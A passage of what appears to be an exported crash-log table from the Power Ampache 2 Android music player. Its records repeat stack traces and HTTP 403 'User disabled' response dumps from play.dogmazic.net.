	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 403 - User disabled - PlaybackException 
 {""errorCode"":403,""extras"":{""mMap"":{}},""timestampMs"":16600022,""cause"":{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":1},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2004,""extras"":{""mMap"":{}},""timestampMs"":16599983,""cause"":{""headerFields"":{""null"":[""HTTP/1.1 403 User disabled""],""Access-Control-Allow-Headers"":[""Authorization, X-Requested-With""],""Access-Control-Allow-Origin"":[""*""],""Cache-Control"":[""no-store, no-cache, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""0""],""Content-Type"":[""text/html; charset\u003dUTF-8""],""Date"":[""Mon, 21 Apr 2025 20:11:57 GMT""],""Expires"":[""Thu, 19 Nov 1981 08:52:00 GMT""],""Keep-Alive"":[""timeout\u003d5, max\u003d53""],""Permissions-Policy"":[""interest-cohort\u003d()""],""Pragma"":[""no-cache""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache""],""Set-Cookie"":[""__Secure-ampache\u003d6p9brsct8nm67kolb0j3j859qc; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax"",""__Secure-ampache\u003dng5mf255563i51m57hvmn6t1to; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains; preload""],""X-Android-Received-Millis"":[""1745266249356""],""X-Android-Response-Source"":[""NETWORK 403""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1745266249063""],""X-Content-Type-Options"":[""nosniff""]},""responseBody"":[],""responseCode"":403,""responseMessage"":""User disabled"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 403"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":268,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""User disabled"",""stackTrace"":[],""suppressedExceptions"":[]}"
tY6eV36R,2025-04-21T21:10:43.612,powerampache,PHP,Monday 21st of April 2025 03:11:52 PM CDT,"1.01-79-free (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.UserNotEnabledException: User disabled
	at luci.sixsixsix.powerampache2.player.SimpleMediaServiceHandler$onPlayerError$1.invokeSuspend(SimpleMediaServiceHandler.kt:288)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
Caused by: androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:268)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 403
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 403 - User disabled - PlaybackException 
 {""errorCode"":403,""extras"":{""mMap"":{}},""timestampMs"":16594205,""cause"":{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":1},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2004,""extras"":{""mMap"":{}},""timestampMs"":16594158,""cause"":{""headerFields"":{""null"":[""HTTP/1.1 403 User disabled""],""Access-Control-Allow-Headers"":[""Authorization, X-Requested-With""],""Access-Control-Allow-Origin"":[""*""],""Cache-Control"":[""no-store, no-cache, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""0""],""Content-Type"":[""text/html; charset\u003dUTF-8""],""Date"":[""Mon, 21 Apr 2025 20:11:51 GMT""],""Expires"":[""Thu, 19 Nov 1981 08:52:00 GMT""],""Keep-Alive"":[""timeout\u003d5, max\u003d61""],""Permissions-Policy"":[""interest-cohort\u003d()""],""Pragma"":[""no-cache""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache""],""Set-Cookie"":[""__Secure-ampache\u003dpbsad0llvoctjl19qm56sr0c43; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax"",""__Secure-ampache\u003dtd2c6vpqev63500ss0p5vennqd; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains; preload""],""X-Android-Received-Millis"":[""1745266243530""],""X-Android-Response-Source"":[""NETWORK 403""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1745266243013""],""X-Content-Type-Options"":[""nosniff""]},""responseBody"":[],""responseCode"":403,""responseMessage"":""User disabled"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 403"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":268,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""User disabled"",""stackTrace"":[],""suppressedExceptions"":[]}"
gwXBznQE,2025-04-21T21:10:37.279,powerampache,PHP,Monday 21st of April 2025 03:11:46 PM CDT,"1.01-79-free (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.UserNotEnabledException: User disabled
	at luci.sixsixsix.powerampache2.player.SimpleMediaServiceHandler$onPlayerError$1.invokeSuspend(SimpleMediaServiceHandler.kt:288)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
Caused by: androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:268)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 403
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 403 - User disabled - PlaybackException 
 {""errorCode"":403,""extras"":{""mMap"":{}},""timestampMs"":16587885,""cause"":{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":1},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2004,""extras"":{""mMap"":{}},""timestampMs"":16587837,""cause"":{""headerFields"":{""null"":[""HTTP/1.1 403 User disabled""],""Access-Control-Allow-Headers"":[""Authorization, X-Requested-With""],""Access-Control-Allow-Origin"":[""*""],""Cache-Control"":[""no-store, no-cache, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""0""],""Content-Type"":[""text/html; charset\u003dUTF-8""],""Date"":[""Mon, 21 Apr 2025 20:11:42 GMT""],""Expires"":[""Thu, 19 Nov 1981 08:52:00 GMT""],""Keep-Alive"":[""timeout\u003d5, max\u003d69""],""Permissions-Policy"":[""interest-cohort\u003d()""],""Pragma"":[""no-cache""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache""],""Set-Cookie"":[""__Secure-ampache\u003d7r61tb9vvf430sl8sl93sl57fg; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax"",""__Secure-ampache\u003do8ld08ireqd555abansni6q52v; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains; preload""],""X-Android-Received-Millis"":[""1745266237215""],""X-Android-Response-Source"":[""NETWORK 403""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1745266234332""],""X-Content-Type-Options"":[""nosniff""]},""responseBody"":[],""responseCode"":403,""responseMessage"":""User disabled"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 403"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":268,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""User disabled"",""stackTrace"":[],""suppressedExceptions"":[]}"
BBNwVenk,2025-04-21T21:10:28.267,powerampache,PHP,Monday 21st of April 2025 03:11:37 PM CDT,"1.01-79-free (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.UserNotEnabledException: User disabled
	at luci.sixsixsix.powerampache2.player.SimpleMediaServiceHandler$onPlayerError$1.invokeSuspend(SimpleMediaServiceHandler.kt:288)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
Caused by: androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:268)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 403
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 403 - User disabled - PlaybackException 
 {""errorCode"":403,""extras"":{""mMap"":{}},""timestampMs"":16578870,""cause"":{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":1},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2004,""extras"":{""mMap"":{}},""timestampMs"":16578797,""cause"":{""headerFields"":{""null"":[""HTTP/1.1 403 User disabled""],""Access-Control-Allow-Headers"":[""Authorization, X-Requested-With""],""Access-Control-Allow-Origin"":[""*""],""Cache-Control"":[""no-store, no-cache, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""0""],""Content-Type"":[""text/html; charset\u003dUTF-8""],""Date"":[""Mon, 21 Apr 2025 20:11:36 GMT""],""Expires"":[""Thu, 19 Nov 1981 08:52:00 GMT""],""Keep-Alive"":[""timeout\u003d5, max\u003d77""],""Permissions-Policy"":[""interest-cohort\u003d()""],""Pragma"":[""no-cache""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache""],""Set-Cookie"":[""__Secure-ampache\u003d1rgsb14tj5v6ov0d9gr2eb5vs5; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax"",""__Secure-ampache\u003de5j80619oruilt93rlr6a1cj2t; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains; preload""],""X-Android-Received-Millis"":[""1745266228166""],""X-Android-Response-Source"":[""NETWORK 403""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1745266227776""],""X-Content-Type-Options"":[""nosniff""]},""responseBody"":[],""responseCode"":403,""responseMessage"":""User disabled"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 403"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":268,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""User disabled"",""stackTrace"":[],""suppressedExceptions"":[]}"
uRgEs9HS,2025-04-21T21:10:21.767,powerampache,PHP,Monday 21st of April 2025 03:11:30 PM CDT,"1.01-79-free (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.UserNotEnabledException: User disabled
	at luci.sixsixsix.powerampache2.player.SimpleMediaServiceHandler$onPlayerError$1.invokeSuspend(SimpleMediaServiceHandler.kt:288)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
Caused by: androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:268)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 403
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 403 - User disabled - PlaybackException 
 {""errorCode"":403,""extras"":{""mMap"":{}},""timestampMs"":16572366,""cause"":{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":1},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2004,""extras"":{""mMap"":{}},""timestampMs"":16572297,""cause"":{""headerFields"":{""null"":[""HTTP/1.1 403 User disabled""],""Access-Control-Allow-Headers"":[""Authorization, X-Requested-With""],""Access-Control-Allow-Origin"":[""*""],""Cache-Control"":[""no-store, no-cache, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""0""],""Content-Type"":[""text/html; charset\u003dUTF-8""],""Date"":[""Mon, 21 Apr 2025 20:11:29 GMT""],""Expires"":[""Thu, 19 Nov 1981 08:52:00 GMT""],""Keep-Alive"":[""timeout\u003d5, max\u003d85""],""Permissions-Policy"":[""interest-cohort\u003d()""],""Pragma"":[""no-cache""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache""],""Set-Cookie"":[""__Secure-ampache\u003dffit0vvdvk3h4k9oeqctest944; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax"",""__Secure-ampache\u003dl258nfgkpqqb3fl8kuii6ggi9f; path\u003d/; domain\u003dplay.dogmazic.net; secure; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains; preload""],""X-Android-Received-Millis"":[""1745266221672""],""X-Android-Response-Source"":[""NETWORK 403""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1745266221324""],""X-Content-Type-Options"":[""nosniff""]},""responseBody"":[],""responseCode"":403,""responseMessage"":""User disabled"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 403"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":268,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""User disabled"",""stackTrace"":[],""suppressedExceptions"":[]}"
GJbNGW4H,2025-04-21T21:10:15.743,powerampache,PHP,Monday 21st of April 2025 03:11:24 PM CDT,"1.01-79-free (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.UserNotEnabledException: User disabled
